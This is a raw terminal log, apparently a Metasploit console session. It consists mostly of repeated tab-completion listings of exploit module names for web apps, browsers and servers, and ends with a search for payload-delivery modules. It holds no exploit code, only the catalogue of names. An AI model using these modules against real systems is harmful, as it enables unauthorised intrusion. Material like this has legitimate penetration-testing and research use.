+use exploit/multi/http/bolt_file_upload
+use exploit/multi/http/builderengine_upload_exec
+use exploit/multi/http/caidao_php_backdoor_exec
+use exploit/multi/http/cisco_dcnm_upload
+use exploit/multi/http/cisco_dcnm_upload_2019
+use exploit/multi/http/clipbucket_fileupload_exec
+use exploit/multi/http/cmsms_object_injection_rce
+use exploit/multi/http/cmsms_showtime2_rce
+use exploit/multi/http/cmsms_upload_rename_rce
+use exploit/multi/http/coldfusion_ckeditor_file_upload
+use exploit/multi/http/coldfusion_rds_auth_bypass
+use exploit/multi/http/confluence_widget_connector
+use exploit/multi/http/cups_bash_env_exec
+use exploit/multi/http/cuteflow_upload_exec
+use exploit/multi/http/dexter_casinoloader_exec
+use exploit/multi/http/drupal_drupageddon
+use exploit/multi/http/eaton_nsm_code_exec
+use exploit/multi/http/eventlog_file_upload
+use exploit/multi/http/extplorer_upload_exec
+use exploit/multi/http/familycms_less_exec
+use exploit/multi/http/freenas_exec_raw
+use exploit/multi/http/gestioip_exec
+use exploit/multi/http/getsimplecms_unauth_code_exec
+--More--[Kuse exploit/multi/http/git_client_command_exec
+use exploit/multi/http/git_submodule_command_exec
+use exploit/multi/http/git_submodule_url_exec
+use exploit/multi/http/gitlab_shell_exec
+use exploit/multi/http/gitlist_arg_injection
+use exploit/multi/http/gitorious_graph
+use exploit/multi/http/glassfish_deployer
+use exploit/multi/http/glossword_upload_exec
+use exploit/multi/http/glpi_install_rce
+use exploit/multi/http/horde_csv_rce
+use exploit/multi/http/horde_form_file_upload
+use exploit/multi/http/horde_href_backdoor
+use exploit/multi/http/hp_sitescope_issuesiebelcmd
+use exploit/multi/http/hp_sitescope_uploadfileshandler
+use exploit/multi/http/hp_sys_mgmt_exec
+use exploit/multi/http/hyperic_hq_script_console
+use exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec
+use exploit/multi/http/ispconfig_php_exec
+use exploit/multi/http/jboss_bshdeployer
+use exploit/multi/http/jboss_deploymentfilerepository
+use exploit/multi/http/jboss_invoke_deploy
+use exploit/multi/http/jboss_maindeployer
+use exploit/multi/http/jboss_seam_upload_exec
+use exploit/multi/http/jenkins_metaprogramming
+use exploit/multi/http/jenkins_script_console
+use exploit/multi/http/jenkins_xstream_deserialize
+use exploit/multi/http/jira_hipchat_template
+use exploit/multi/http/jira_plugin_upload
+use exploit/multi/http/joomla_http_header_rce
+use exploit/multi/http/kordil_edms_upload_exec
+use exploit/multi/http/lcms_php_exec
+use exploit/multi/http/liferay_java_unmarshalling
+use exploit/multi/http/log1cms_ajax_create_folder
+--More--[Kuse exploit/multi/http/magento_unserialize
+use exploit/multi/http/makoserver_cmd_exec
+use exploit/multi/http/manage_engine_dc_pmp_sqli
+use exploit/multi/http/manageengine_auth_upload
+use exploit/multi/http/manageengine_sd_uploader
+use exploit/multi/http/manageengine_search_sqli
+use exploit/multi/http/mantisbt_manage_proj_page_rce
+use exploit/multi/http/mantisbt_php_exec
+use exploit/multi/http/mediawiki_syntaxhighlight
+use exploit/multi/http/mediawiki_thumb
+use exploit/multi/http/metasploit_static_secret_key_base
+use exploit/multi/http/metasploit_webui_console_command_execution
+use exploit/multi/http/mma_backdoor_upload
+use exploit/multi/http/mobilecartly_upload_exec
+use exploit/multi/http/monstra_fileupload_exec
+use exploit/multi/http/moodle_cmd_exec
+use exploit/multi/http/movabletype_upgrade_exec
+use exploit/multi/http/mutiny_subnetmask_exec
+use exploit/multi/http/nas4free_php_exec
+use exploit/multi/http/navigate_cms_rce
+use exploit/multi/http/netwin_surgeftp_exec
+use exploit/multi/http/nibbleblog_file_upload
+use exploit/multi/http/nostromo_code_exec
+use exploit/multi/http/novell_servicedesk_rce
+use exploit/multi/http/nuuo_nvrmini_upgrade_rce
+use exploit/multi/http/october_upload_bypass_exec
+use exploit/multi/http/op5_license
+use exploit/multi/http/op5_welcome
+use exploit/multi/http/openfire_auth_bypass
+use exploit/multi/http/openmediavault_cmd_exec
+use exploit/multi/http/openmrs_deserialization
+use exploit/multi/http/openx_backdoor_php
+use exploit/multi/http/opmanager_socialit_file_upload
+--More--[Kuse exploit/multi/http/oracle_ats_file_upload
+use exploit/multi/http/oracle_reports_rce
+use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
+use exploit/multi/http/orientdb_exec
+use exploit/multi/http/oscommerce_installer_unauth_code_exec
+use exploit/multi/http/pandora_upload_exec
+use exploit/multi/http/phoenix_exec
+use exploit/multi/http/php_cgi_arg_injection
+use exploit/multi/http/php_fpm_rce
+use exploit/multi/http/php_utility_belt_rce
+use exploit/multi/http/php_volunteer_upload_exec
+use exploit/multi/http/phpfilemanager_rce
+use exploit/multi/http/phpldapadmin_query_engine
+use exploit/multi/http/phpmailer_arg_injection
+use exploit/multi/http/phpmoadmin_exec
+use exploit/multi/http/phpmyadmin_3522_backdoor
+use exploit/multi/http/phpmyadmin_lfi_rce
+use exploit/multi/http/phpmyadmin_null_termination_exec
+use exploit/multi/http/phpmyadmin_preg_replace
+use exploit/multi/http/phpscheduleit_start_date
+use exploit/multi/http/phpstudy_backdoor_rce
+use exploit/multi/http/phptax_exec
+use exploit/multi/http/phpwiki_ploticus_exec
+use exploit/multi/http/pimcore_unserialize_rce
+use exploit/multi/http/playsms_filename_exec
+use exploit/multi/http/playsms_template_injection
+use exploit/multi/http/playsms_uploadcsv_exec
+use exploit/multi/http/plone_popen2
+use exploit/multi/http/pmwiki_pagelist
+use exploit/multi/http/polarcms_upload_exec
+use exploit/multi/http/processmaker_exec
+use exploit/multi/http/processmaker_plugin_upload
+use exploit/multi/http/qdpm_upload_exec
+--More--[Kuse exploit/multi/http/rails_actionpack_inline_exec
+use exploit/multi/http/rails_double_tap
+use exploit/multi/http/rails_dynamic_render_code_exec
+use exploit/multi/http/rails_json_yaml_code_exec
+use exploit/multi/http/rails_secret_deserialization
+use exploit/multi/http/rails_web_console_v2_code_exec
+use exploit/multi/http/rails_xml_yaml_code_exec
+use exploit/multi/http/rocket_servergraph_file_requestor_rce
+use exploit/multi/http/sflog_upload_exec
+use exploit/multi/http/shiro_rememberme_v124_deserialize
+use exploit/multi/http/shopware_createinstancefromnamedarguments_rce
+use exploit/multi/http/simple_backdoors_exec
+use exploit/multi/http/sit_file_upload
+use exploit/multi/http/snortreport_exec
+use exploit/multi/http/solarwinds_store_manager_auth_filter
+use exploit/multi/http/solr_velocity_rce
+use exploit/multi/http/sonicwall_gms_upload
+use exploit/multi/http/sonicwall_scrutinizer_methoddetail_sqli
+use exploit/multi/http/splunk_mappy_exec
+use exploit/multi/http/splunk_upload_app_exec
+use exploit/multi/http/spree_search_exec
+use exploit/multi/http/spree_searchlogic_exec
+use exploit/multi/http/struts2_code_exec_showcase
+use exploit/multi/http/struts2_content_type_ognl
+use exploit/multi/http/struts2_namespace_ognl
+use exploit/multi/http/struts2_rest_xstream
+use exploit/multi/http/struts_code_exec
+use exploit/multi/http/struts_code_exec_classloader
+use exploit/multi/http/struts_code_exec_exception_delegator
+use exploit/multi/http/struts_code_exec_parameters
+use exploit/multi/http/struts_default_action_mapper
+use exploit/multi/http/struts_dev_mode
+use exploit/multi/http/struts_dmi_exec
+--More--[Kuse exploit/multi/http/struts_dmi_rest_exec
+use exploit/multi/http/struts_include_params
+use exploit/multi/http/stunshell_eval
+use exploit/multi/http/stunshell_exec
+use exploit/multi/http/sun_jsws_dav_options
+use exploit/multi/http/sysaid_auth_file_upload
+use exploit/multi/http/sysaid_rdslogs_file_upload
+use exploit/multi/http/testlink_upload_exec
+use exploit/multi/http/tomcat_jsp_upload_bypass
+use exploit/multi/http/tomcat_mgr_deploy
+use exploit/multi/http/tomcat_mgr_upload
+use exploit/multi/http/totaljs_cms_widget_exec
+use exploit/multi/http/traq_plugin_exec
+use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi
+use exploit/multi/http/uptime_file_upload_1
+use exploit/multi/http/uptime_file_upload_2
+use exploit/multi/http/v0pcr3w_exec
+use exploit/multi/http/vbseo_proc_deutf
+use exploit/multi/http/vbulletin_unserialize
+use exploit/multi/http/vbulletin_widgetconfig_rce
+use exploit/multi/http/visual_mining_netcharts_upload
+use exploit/multi/http/vtiger_install_rce
+use exploit/multi/http/vtiger_logo_upload_exec
+use exploit/multi/http/vtiger_php_exec
+use exploit/multi/http/vtiger_soap_upload
+use exploit/multi/http/webnms_file_upload
+use exploit/multi/http/webpagetest_upload_exec
+use exploit/multi/http/werkzeug_debug_rce
+use exploit/multi/http/wikka_spam_exec
+use exploit/multi/http/wp_crop_rce
+use exploit/multi/http/wp_db_backup_rce
+use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload
+use exploit/multi/http/wp_responsive_thumbnail_slider_upload
+--More--[Kuse exploit/multi/http/x7chat2_php_exec
+use exploit/multi/http/zabbix_script_exec
+use exploit/multi/http/zemra_panel_rce
+use exploit/multi/http/zenworks_configuration_management_upload
+use exploit/multi/http/zenworks_control_center_upload
+use exploit/multi/http/zpanel_information_disclosure_rce
+use exploit/multi/ids/snort_dce_rpc
+use exploit/multi/local/allwinner_backdoor
+use exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc
+use exploit/multi/local/xorg_x11_suid_server
+use exploit/multi/local/xorg_x11_suid_server_modulepath
+use exploit/multi/misc/arkeia_agent_exec
+use exploit/multi/misc/batik_svg_java
+use exploit/multi/misc/bmc_patrol_cmd_exec
+use exploit/multi/misc/bmc_server_automation_rscd_nsh_rce
+use exploit/multi/misc/claymore_dual_miner_remote_manager_rce
+use exploit/multi/misc/consul_rexec_exec
+use exploit/multi/misc/consul_service_exec
+use exploit/multi/misc/erlang_cookie_rce
+use exploit/multi/misc/freeswitch_event_socket_cmd_exec
+use exploit/multi/misc/hp_data_protector_exec_integutil
+use exploit/multi/misc/hp_vsa_exec
+use exploit/multi/misc/ibm_tm1_unauth_rce
+use exploit/multi/misc/indesign_server_soap
+use exploit/multi/misc/java_jdwp_debugger
+use exploit/multi/misc/java_jmx_server
+use exploit/multi/misc/java_rmi_server
+use exploit/multi/misc/legend_bot_exec
+use exploit/multi/misc/msf_rpc_console
+use exploit/multi/misc/msfd_rce_remote
+use exploit/multi/misc/nodejs_v8_debugger
+use exploit/multi/misc/openoffice_document_macro
+use exploit/multi/misc/openview_omniback_exec
+--More--[Kuse exploit/multi/misc/osgi_console_exec
+use exploit/multi/misc/pbot_exec
+use exploit/multi/misc/persistent_hpca_radexec_exec
+use exploit/multi/misc/ra1nx_pubcall_exec
+use exploit/multi/misc/teamcity_agent_xmlrpc_exec
+use exploit/multi/misc/veritas_netbackup_cmdexec
+use exploit/multi/misc/w3tw0rk_exec
+use exploit/multi/misc/weblogic_deserialize
+use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
+use exploit/multi/misc/weblogic_deserialize_badattrval
+use exploit/multi/misc/weblogic_deserialize_marshalledobject
+use exploit/multi/misc/weblogic_deserialize_rawobject
+use exploit/multi/misc/weblogic_deserialize_unicastref
+use exploit/multi/misc/wireshark_lwres_getaddrbyname
+use exploit/multi/misc/wireshark_lwres_getaddrbyname_loop
+use exploit/multi/misc/xdh_x_exec
+use exploit/multi/misc/zend_java_bridge
+use exploit/multi/mysql/mysql_udf_payload
+use exploit/multi/ntp/ntp_overflow
+use exploit/multi/php/php_unserialize_zval_cookie
+use exploit/multi/php/wp_duplicator_code_inject
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+use exploit/multi/postgres/postgres_createlang
+use exploit/multi/realserver/describe
+use exploit/multi/samba/nttrans
+use exploit/multi/samba/usermap_script
+use exploit/multi/sap/sap_mgmt_con_osexec_payload
+use exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec
+use exploit/multi/sap/sap_soap_rfc_sxpg_command_exec
+use exploit/multi/script/web_delivery
+use exploit/multi/ssh/sshexec
+use exploit/multi/svn/svnserve_date
+use exploit/multi/upnp/libupnp_ssdp_overflow
+--More--[Kuse exploit/multi/vnc/vnc_keyboard_exec
+use exploit/multi/vpn/tincd_bof
+use exploit/multi/wyse/hagent_untrusted_hsdata
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/multi/[H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/multi/wyse/hagent_untrusted_hsdata [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K
+Display all 333 possibilities? (y or n)
+use exploit/multi/browser/adobe_flash_hacking_team_uaf
+use exploit/multi/browser/adobe_flash_nellymoser_bof
+use exploit/multi/browser/adobe_flash_net_connection_confusion
+use exploit/multi/browser/adobe_flash_opaque_background_uaf
+use exploit/multi/browser/adobe_flash_pixel_bender_bof
+use exploit/multi/browser/adobe_flash_shader_drawing_fill
+use exploit/multi/browser/adobe_flash_shader_job_overflow
+use exploit/multi/browser/adobe_flash_uncompress_zlib_uaf
+use exploit/multi/browser/chrome_array_map
+use exploit/multi/browser/chrome_jscreate_sideeffect
+use exploit/multi/browser/chrome_object_create
+use exploit/multi/browser/firefox_escape_retval
+use exploit/multi/browser/firefox_pdfjs_privilege_escalation
+use exploit/multi/browser/firefox_proto_crmfrequest
+use exploit/multi/browser/firefox_proxy_prototype
+use exploit/multi/browser/firefox_queryinterface
+use exploit/multi/browser/firefox_svg_plugin
+use exploit/multi/browser/firefox_tostring_console_injection
+use exploit/multi/browser/firefox_webidl_injection
+use exploit/multi/browser/firefox_xpi_bootstrapped_addon
+use exploit/multi/browser/itms_overflow
+use exploit/multi/browser/java_atomicreferencearray
+use exploit/multi/browser/java_calendar_deserialize
+use exploit/multi/browser/java_getsoundbank_bof
+use exploit/multi/browser/java_jre17_driver_manager
+use exploit/multi/browser/java_jre17_exec
+use exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl
+use exploit/multi/browser/java_jre17_jaxws
+use exploit/multi/browser/java_jre17_jmxbean
+use exploit/multi/browser/java_jre17_jmxbean_2
+use exploit/multi/browser/java_jre17_method_handle
+use exploit/multi/browser/java_jre17_provider_skeleton
+use exploit/multi/browser/java_jre17_reflection_types
+--More--[Kuse exploit/multi/browser/java_rhino
+use exploit/multi/browser/java_rmi_connection_impl
+use exploit/multi/browser/java_setdifficm_bof
+use exploit/multi/browser/java_signed_applet
+use exploit/multi/browser/java_storeimagearray
+use exploit/multi/browser/java_trusted_chain
+use exploit/multi/browser/java_verifier_field_access
+use exploit/multi/browser/mozilla_compareto
+use exploit/multi/browser/mozilla_navigatorjava
+use exploit/multi/browser/msfd_rce_browser
+use exploit/multi/browser/opera_configoverwrite
+use exploit/multi/browser/opera_historysearch
+use exploit/multi/browser/qtjava_pointer
+use exploit/multi/elasticsearch/script_mvel_rce
+use exploit/multi/elasticsearch/search_groovy_script
+use exploit/multi/fileformat/adobe_u3d_meshcont
+use exploit/multi/fileformat/evince_cbt_cmd_injection
+use exploit/multi/fileformat/ghostscript_failed_restore
+use exploit/multi/fileformat/js_unpacker_eval_injection
+use exploit/multi/fileformat/libreoffice_logo_exec
+use exploit/multi/fileformat/libreoffice_macro_exec
+use exploit/multi/fileformat/maple_maplet
+use exploit/multi/fileformat/nodejs_js_yaml_load_code_exec
+use exploit/multi/fileformat/office_word_macro
+use exploit/multi/fileformat/peazip_command_injection
+use exploit/multi/fileformat/swagger_param_inject
+use exploit/multi/fileformat/zip_slip
+use exploit/multi/ftp/pureftpd_bash_env_exec
+use exploit/multi/ftp/wuftpd_site_exec_format
+use exploit/multi/gdb/gdb_server_exec
+use exploit/multi/hams/steamed
+use exploit/multi/handler
+use exploit/multi/http/activecollab_chat
+--More--[Kuse exploit/multi/http/ajaxplorer_checkinstall_exec
+use exploit/multi/http/apache_activemq_upload_jsp
+use exploit/multi/http/apache_jetspeed_file_upload
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+use exploit/multi/http/apache_roller_ognl_injection
+use exploit/multi/http/apprain_upload_exec
+use exploit/multi/http/atutor_sqli
+use exploit/multi/http/auxilium_upload_exec
+use exploit/multi/http/axis2_deployer
+use exploit/multi/http/bassmaster_js_injection
+use exploit/multi/http/bolt_file_upload
+use exploit/multi/http/builderengine_upload_exec
+use exploit/multi/http/caidao_php_backdoor_exec
+use exploit/multi/http/cisco_dcnm_upload
+use exploit/multi/http/cisco_dcnm_upload_2019
+use exploit/multi/http/clipbucket_fileupload_exec
+use exploit/multi/http/cmsms_object_injection_rce
+use exploit/multi/http/cmsms_showtime2_rce
+use exploit/multi/http/cmsms_upload_rename_rce
+use exploit/multi/http/coldfusion_ckeditor_file_upload
+use exploit/multi/http/coldfusion_rds_auth_bypass
+use exploit/multi/http/confluence_widget_connector
+use exploit/multi/http/cups_bash_env_exec
+use exploit/multi/http/cuteflow_upload_exec
+use exploit/multi/http/dexter_casinoloader_exec
+use exploit/multi/http/drupal_drupageddon
+use exploit/multi/http/eaton_nsm_code_exec
+use exploit/multi/http/eventlog_file_upload
+use exploit/multi/http/extplorer_upload_exec
+use exploit/multi/http/familycms_less_exec
+use exploit/multi/http/freenas_exec_raw
+use exploit/multi/http/gestioip_exec
+use exploit/multi/http/getsimplecms_unauth_code_exec
+--More--[Kuse exploit/multi/http/git_client_command_exec
+use exploit/multi/http/git_submodule_command_exec
+use exploit/multi/http/git_submodule_url_exec
+use exploit/multi/http/gitlab_shell_exec
+use exploit/multi/http/gitlist_arg_injection
+use exploit/multi/http/gitorious_graph
+use exploit/multi/http/glassfish_deployer
+use exploit/multi/http/glossword_upload_exec
+use exploit/multi/http/glpi_install_rce
+use exploit/multi/http/horde_csv_rce
+use exploit/multi/http/horde_form_file_upload
+use exploit/multi/http/horde_href_backdoor
+use exploit/multi/http/hp_sitescope_issuesiebelcmd
+use exploit/multi/http/hp_sitescope_uploadfileshandler
+use exploit/multi/http/hp_sys_mgmt_exec
+use exploit/multi/http/hyperic_hq_script_console
+use exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec
+use exploit/multi/http/ispconfig_php_exec
+use exploit/multi/http/jboss_bshdeployer
+use exploit/multi/http/jboss_deploymentfilerepository
+use exploit/multi/http/jboss_invoke_deploy
+use exploit/multi/http/jboss_maindeployer
+use exploit/multi/http/jboss_seam_upload_exec
+use exploit/multi/http/jenkins_metaprogramming
+use exploit/multi/http/jenkins_script_console
+use exploit/multi/http/jenkins_xstream_deserialize
+use exploit/multi/http/jira_hipchat_template
+use exploit/multi/http/jira_plugin_upload
+use exploit/multi/http/joomla_http_header_rce
+use exploit/multi/http/kordil_edms_upload_exec
+use exploit/multi/http/lcms_php_exec
+use exploit/multi/http/liferay_java_unmarshalling
+use exploit/multi/http/log1cms_ajax_create_folder
+--More--[Kuse exploit/multi/http/magento_unserialize
+use exploit/multi/http/makoserver_cmd_exec
+use exploit/multi/http/manage_engine_dc_pmp_sqli
+use exploit/multi/http/manageengine_auth_upload
+use exploit/multi/http/manageengine_sd_uploader
+use exploit/multi/http/manageengine_search_sqli
+use exploit/multi/http/mantisbt_manage_proj_page_rce
+use exploit/multi/http/mantisbt_php_exec
+use exploit/multi/http/mediawiki_syntaxhighlight
+use exploit/multi/http/mediawiki_thumb
+use exploit/multi/http/metasploit_static_secret_key_base
+use exploit/multi/http/metasploit_webui_console_command_execution
+use exploit/multi/http/mma_backdoor_upload
+use exploit/multi/http/mobilecartly_upload_exec
+use exploit/multi/http/monstra_fileupload_exec
+use exploit/multi/http/moodle_cmd_exec
+use exploit/multi/http/movabletype_upgrade_exec
+use exploit/multi/http/mutiny_subnetmask_exec
+use exploit/multi/http/nas4free_php_exec
+use exploit/multi/http/navigate_cms_rce
+use exploit/multi/http/netwin_surgeftp_exec
+use exploit/multi/http/nibbleblog_file_upload
+use exploit/multi/http/nostromo_code_exec
+use exploit/multi/http/novell_servicedesk_rce
+use exploit/multi/http/nuuo_nvrmini_upgrade_rce
+use exploit/multi/http/october_upload_bypass_exec
+use exploit/multi/http/op5_license
+use exploit/multi/http/op5_welcome
+use exploit/multi/http/openfire_auth_bypass
+use exploit/multi/http/openmediavault_cmd_exec
+use exploit/multi/http/openmrs_deserialization
+use exploit/multi/http/openx_backdoor_php
+use exploit/multi/http/opmanager_socialit_file_upload
+--More--[Kuse exploit/multi/http/oracle_ats_file_upload
+use exploit/multi/http/oracle_reports_rce
+use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
+use exploit/multi/http/orientdb_exec
+use exploit/multi/http/oscommerce_installer_unauth_code_exec
+use exploit/multi/http/pandora_upload_exec
+use exploit/multi/http/phoenix_exec
+use exploit/multi/http/php_cgi_arg_injection
+use exploit/multi/http/php_fpm_rce
+use exploit/multi/http/php_utility_belt_rce
+use exploit/multi/http/php_volunteer_upload_exec
+use exploit/multi/http/phpfilemanager_rce
+use exploit/multi/http/phpldapadmin_query_engine
+use exploit/multi/http/phpmailer_arg_injection
+use exploit/multi/http/phpmoadmin_exec
+use exploit/multi/http/phpmyadmin_3522_backdoor
+use exploit/multi/http/phpmyadmin_lfi_rce
+use exploit/multi/http/phpmyadmin_null_termination_exec
+use exploit/multi/http/phpmyadmin_preg_replace
+use exploit/multi/http/phpscheduleit_start_date
+use exploit/multi/http/phpstudy_backdoor_rce
+use exploit/multi/http/phptax_exec
+use exploit/multi/http/phpwiki_ploticus_exec
+use exploit/multi/http/pimcore_unserialize_rce
+use exploit/multi/http/playsms_filename_exec
+use exploit/multi/http/playsms_template_injection
+use exploit/multi/http/playsms_uploadcsv_exec
+use exploit/multi/http/plone_popen2
+use exploit/multi/http/pmwiki_pagelist
+use exploit/multi/http/polarcms_upload_exec
+use exploit/multi/http/processmaker_exec
+use exploit/multi/http/processmaker_plugin_upload
+use exploit/multi/http/qdpm_upload_exec
+--More--[Kuse exploit/multi/http/rails_actionpack_inline_exec
+use exploit/multi/http/rails_double_tap
+use exploit/multi/http/rails_dynamic_render_code_exec
+use exploit/multi/http/rails_json_yaml_code_exec
+use exploit/multi/http/rails_secret_deserialization
+use exploit/multi/http/rails_web_console_v2_code_exec
+use exploit/multi/http/rails_xml_yaml_code_exec
+use exploit/multi/http/rocket_servergraph_file_requestor_rce
+use exploit/multi/http/sflog_upload_exec
+use exploit/multi/http/shiro_rememberme_v124_deserialize
+use exploit/multi/http/shopware_createinstancefromnamedarguments_rce
+use exploit/multi/http/simple_backdoors_exec
+use exploit/multi/http/sit_file_upload
+use exploit/multi/http/snortreport_exec
+use exploit/multi/http/solarwinds_store_manager_auth_filter
+use exploit/multi/http/solr_velocity_rce
+use exploit/multi/http/sonicwall_gms_upload
+use exploit/multi/http/sonicwall_scrutinizer_methoddetail_sqli
+use exploit/multi/http/splunk_mappy_exec
+use exploit/multi/http/splunk_upload_app_exec
+use exploit/multi/http/spree_search_exec
+use exploit/multi/http/spree_searchlogic_exec
+use exploit/multi/http/struts2_code_exec_showcase
+use exploit/multi/http/struts2_content_type_ognl
+use exploit/multi/http/struts2_namespace_ognl
+use exploit/multi/http/struts2_rest_xstream
+use exploit/multi/http/struts_code_exec
+use exploit/multi/http/struts_code_exec_classloader
+use exploit/multi/http/struts_code_exec_exception_delegator
+use exploit/multi/http/struts_code_exec_parameters
+use exploit/multi/http/struts_default_action_mapper
+use exploit/multi/http/struts_dev_mode
+use exploit/multi/http/struts_dmi_exec
+--More--[Kuse exploit/multi/http/struts_dmi_rest_exec
+use exploit/multi/http/struts_include_params
+use exploit/multi/http/stunshell_eval
+use exploit/multi/http/stunshell_exec
+use exploit/multi/http/sun_jsws_dav_options
+use exploit/multi/http/sysaid_auth_file_upload
+use exploit/multi/http/sysaid_rdslogs_file_upload
+use exploit/multi/http/testlink_upload_exec
+use exploit/multi/http/tomcat_jsp_upload_bypass
+use exploit/multi/http/tomcat_mgr_deploy
+use exploit/multi/http/tomcat_mgr_upload
+use exploit/multi/http/totaljs_cms_widget_exec
+use exploit/multi/http/traq_plugin_exec
+use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi
+use exploit/multi/http/uptime_file_upload_1
+use exploit/multi/http/uptime_file_upload_2
+use exploit/multi/http/v0pcr3w_exec
+use exploit/multi/http/vbseo_proc_deutf
+use exploit/multi/http/vbulletin_unserialize
+use exploit/multi/http/vbulletin_widgetconfig_rce
+use exploit/multi/http/visual_mining_netcharts_upload
+use exploit/multi/http/vtiger_install_rce
+use exploit/multi/http/vtiger_logo_upload_exec
+use exploit/multi/http/vtiger_php_exec
+use exploit/multi/http/vtiger_soap_upload
+use exploit/multi/http/webnms_file_upload
+use exploit/multi/http/webpagetest_upload_exec
+use exploit/multi/http/werkzeug_debug_rce
+use exploit/multi/http/wikka_spam_exec
+use exploit/multi/http/wp_crop_rce
+use exploit/multi/http/wp_db_backup_rce
+use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload
+use exploit/multi/http/wp_responsive_thumbnail_slider_upload
+--More--[Kuse exploit/multi/http/x7chat2_php_exec
+use exploit/multi/http/zabbix_script_exec
+use exploit/multi/http/zemra_panel_rce
+use exploit/multi/http/zenworks_configuration_management_upload
+use exploit/multi/http/zenworks_control_center_upload
+use exploit/multi/http/zpanel_information_disclosure_rce
+use exploit/multi/ids/snort_dce_rpc
+use exploit/multi/local/allwinner_backdoor
+use exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc
+use exploit/multi/local/xorg_x11_suid_server
+use exploit/multi/local/xorg_x11_suid_server_modulepath
+use exploit/multi/misc/arkeia_agent_exec
+use exploit/multi/misc/batik_svg_java
+use exploit/multi/misc/bmc_patrol_cmd_exec
+use exploit/multi/misc/bmc_server_automation_rscd_nsh_rce
+use exploit/multi/misc/claymore_dual_miner_remote_manager_rce
+use exploit/multi/misc/consul_rexec_exec
+use exploit/multi/misc/consul_service_exec
+use exploit/multi/misc/erlang_cookie_rce
+use exploit/multi/misc/freeswitch_event_socket_cmd_exec
+use exploit/multi/misc/hp_data_protector_exec_integutil
+use exploit/multi/misc/hp_vsa_exec
+use exploit/multi/misc/ibm_tm1_unauth_rce
+use exploit/multi/misc/indesign_server_soap
+use exploit/multi/misc/java_jdwp_debugger
+use exploit/multi/misc/java_jmx_server
+use exploit/multi/misc/java_rmi_server
+use exploit/multi/misc/legend_bot_exec
+use exploit/multi/misc/msf_rpc_console
+use exploit/multi/misc/msfd_rce_remote
+use exploit/multi/misc/nodejs_v8_debugger
+use exploit/multi/misc/openoffice_document_macro
+use exploit/multi/misc/openview_omniback_exec
+--More--[Kuse exploit/multi/misc/osgi_console_exec
+use exploit/multi/misc/pbot_exec
+use exploit/multi/misc/persistent_hpca_radexec_exec
+use exploit/multi/misc/ra1nx_pubcall_exec
+use exploit/multi/misc/teamcity_agent_xmlrpc_exec
+use exploit/multi/misc/veritas_netbackup_cmdexec
+use exploit/multi/misc/w3tw0rk_exec
+use exploit/multi/misc/weblogic_deserialize
+use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
+use exploit/multi/misc/weblogic_deserialize_badattrval
+use exploit/multi/misc/weblogic_deserialize_marshalledobject
+use exploit/multi/misc/weblogic_deserialize_rawobject
+use exploit/multi/misc/weblogic_deserialize_unicastref
+use exploit/multi/misc/wireshark_lwres_getaddrbyname
+use exploit/multi/misc/wireshark_lwres_getaddrbyname_loop
+use exploit/multi/misc/xdh_x_exec
+use exploit/multi/misc/zend_java_bridge
+use exploit/multi/mysql/mysql_udf_payload
+use exploit/multi/ntp/ntp_overflow
+use exploit/multi/php/php_unserialize_zval_cookie
+use exploit/multi/php/wp_duplicator_code_inject
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+use exploit/multi/postgres/postgres_createlang
+use exploit/multi/realserver/describe
+use exploit/multi/samba/nttrans
+use exploit/multi/samba/usermap_script
+use exploit/multi/sap/sap_mgmt_con_osexec_payload
+use exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec
+use exploit/multi/sap/sap_soap_rfc_sxpg_command_exec
+use exploit/multi/script/web_delivery
+use exploit/multi/ssh/sshexec
+use exploit/multi/svn/svnserve_date
+use exploit/multi/upnp/libupnp_ssdp_overflow
+--More--[Kuse exploit/multi/vnc/vnc_keyboard_exec
+use exploit/multi/vpn/tincd_bof
+use exploit/multi/wyse/hagent_untrusted_hsdata
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/multi/[P[P[Psearch delivery
+[0m
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   auxiliary/client/smtp/emailer                                                normal     No     Generic Emailer (SMTP)
+   1   auxiliary/server/regsvr32_command_[45mdelivery[0m_server                            normal     No     Regsvr32.exe (.sct) Command [45mDelivery[0m Server
+   2   exploit/linux/http/citrix_dir_traversal_rce                 2019-12-17       [32mexcellent[0m  Yes    Citrix ADC (NetScaler) Directory Traversal RCE
+   3   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       [32mexcellent[0m  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   4   exploit/multi/script/web_[45mdelivery[0m                           2013-07-19       manual     No     Script Web [45mDelivery[0m
+   5   exploit/windows/fileformat/irfanview_jpeg2000_bof           2012-01-16       normal     No     Irfanview JPEG2000 jp2 Stack Buffer Overflow
+   6   exploit/windows/fileformat/office_dde_[45mdelivery[0m              2017-10-09       manual     No     Microsoft Office DDE Payload [45mDelivery[0m
+   7   exploit/windows/fileformat/office_excel_slk                 2018-10-07       manual     No     Microsoft Excel .SLK Payload [45mDelivery[0m
+   8   exploit/windows/misc/ais_esel_server_rce                    2019-03-27       [32mexcellent[0m  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
+   9   exploit/windows/misc/webdav_[45mdelivery[0m                        1999-01-01       manual     No     Serve DLL via webdav server
